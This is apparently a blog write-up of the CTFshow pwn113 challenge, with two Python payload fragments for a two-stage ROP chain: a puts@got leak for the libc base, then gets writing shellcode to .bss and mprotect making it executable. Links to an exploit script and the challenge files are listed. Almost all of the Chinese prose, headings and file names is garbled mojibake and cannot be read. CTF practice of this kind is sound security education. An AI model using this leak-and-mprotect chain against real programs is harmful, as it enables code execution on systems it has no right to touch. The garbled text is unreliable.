---
title: CTFshow pwn113 ret2libc + mprotect
published: 2026-04-17
updated: 2026-04-17
description: 涓ゆ寮忓埄鐢紝鍏?leak puts 绠?libc锛屽啀璋?gets 鍜?mprotect 鎶婂彲鍐欐鏀规垚鍙墽琛岋紝鏈€鍚庣亴 shellcode 璇?flag銆
tags: [CTFshow, Pwn, Stack, ROP, Ret2Libc, Mprotect]
category: ctfshow
draft: false
---

# 棰樼洰缁撹

杩欓宸茬粡涓嶆槸鍗曠函 ret2text锛岃€屾槸瀹屾暣鐨勪袱娈靛紡 ROP銆?
绗竴娈靛厛娉勯湶 `puts@got` 鎷垮埌 libc 鍩哄潃銆傜浜屾璋冪敤 `gets` 鎶?shellcode 鍐欏叆 `.bss`锛屽啀璋冪敤 `mprotect` 鎶婂搴旈〉鏀规垚 `rwx`锛屾渶鍚庤烦杩囧幓鎵ц璇?flag 鐨?shellcode銆?
## 鍒╃敤閾?
1. `pop rdi; ret` 鎶?`puts@got` 浼犵粰 `puts@plt`
2. 杩斿洖 `main`锛岃绋嬪簭閲嶆柊杩涘叆鍙帶鐘舵€?3. 鏍规嵁娉勯湶鍊艰绠?`libc_base`
4. 鐢?ROP 璋?`gets(data)` 寰€ `.bss` 鍐?shellcode
5. 璋?`mprotect(data_page, 0x1000, 7)`
6. 璺宠浆鍒?`data`

## 鍏抽敭 exp 鐗囨

```python
payload = b"A" * 0x418 + p8(0x28)
payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_ret)
sl(payload)
```

```python
payload = b"A" * 0x418 + p8(0x28) + p64(pop_rdi_ret) + p64(data)
payload += p64(gets_addr)
payload += p64(pop_rdi_ret) + p64(data)
payload += p64(pop_rsi) + p64(0x1000) + p64(pop_rdx) + p64(7)
payload += p64(mprotect_addr) + p64(data)
sl(payload)
```

## 涓嬭浇

- [涓嬭浇棰樼洰闄勪欢 `pwn`](../../attachments/ctfshow/pwn113/pwn)
- [涓嬭浇鍒╃敤鑴氭湰 `绋嬪簭娴佸垎鏋?py`](../../attachments/ctfshow/pwn113/绋嬪簭娴佸垎鏋?py)
- [涓嬭浇鍘熷绗旇 `Bypass_pwn113.md`](../../attachments/ctfshow/pwn113/Bypass_pwn113.md)
- [涓嬭浇棰樼洰闄勫甫 libc 鍖?`libc6_2.27-3ubuntu1_amd64.deb`](../../attachments/ctfshow/pwn113/libc6_2.27-3ubuntu1_amd64.deb)

## 閫傚悎璁颁綇鐨勭偣

褰撻鐩棦涓嶇粰 system锛屼篃涓嶆柟渚?one_gadget 鏃讹紝`leak libc -> gets shellcode -> mprotect -> jump` 鏄竴鏉″緢閫氱敤鐨勫鐢ㄨ矾绾裤€?

